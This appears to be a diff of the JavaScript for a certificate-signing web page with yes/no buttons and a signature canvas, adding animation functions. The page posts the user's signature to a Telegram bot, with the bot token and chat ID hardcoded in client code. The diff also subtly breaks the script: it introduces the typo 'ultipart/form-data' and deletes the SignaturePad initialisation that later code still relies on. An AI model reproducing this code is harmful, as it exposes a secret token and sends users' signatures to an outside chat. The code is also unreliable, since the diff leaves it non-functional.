@@ -11,6 +11,7 @@ yesBtn.addEventListener('click', () => {
     certificateContainer.style.display = 'block';
     yesBtn.style.display = 'none';
     noBtn.style.display = 'none';
+    animateCertificate(); // Add animation to certificate container
 });
 
 noBtn.addEventListener('click', () => {
@@ -35,33 +36,39 @@ signBtn.addEventListener('click', () => {
             }
         })
     })
-    .then(response => response.json())
-    .then(data => {
+   .then(response => response.json())
+   .then(data => {
         fetch('https://api.telegram.org/bot6690815586:AAFh5kcrmt7Heggp-Syg66FDlGP9idUzQEI/sendPhoto', {
             method: 'POST',
             headers: {
-                'Content-Type': 'multipart/form-data'
+                'Content-Type': 'ultipart/form-data'
             },
             body: new URLSearchParams({
                 chat_id: '5456798232',
                 photo: signature
             })
         })
-        .then(response => response.json())
-        .then(data => {
+       .then(response => response.json())
+       .then(data => {
             finalMsg.style.display = 'block';
             certificateContainer.style.display = 'none';
+            animateFinalMsg(); // Add animation to final message
         });
     });
 });
 
-// Initialize the signature canvas
-let signature = new SignaturePad(signatureCanvas);
+// Add animation to certificate container
+function animateCertificate() {
+    certificateContainer.classList.add('animate-certificate');
+    setTimeout(() => {
+        certificateContainer.classList.remove('animate-certificate');
+    }, 2000);
+}
 
-signature.addEventListener('beginStroke', () => {
-    signatureCanvas.style.cursor = 'crosshair';
-});
-
-signature.addEventListener('endStroke', () => {
-    signatureCanvas.style.cursor = 'default';
-});
+// Add animation to final message
+function animateFinalMsg() {
+    finalMsg.classList.add('animate-final-msg');
+    setTimeout(() => {
+        finalMsg.classList.remove('animate-final-msg');
+    }, 2000);
+}
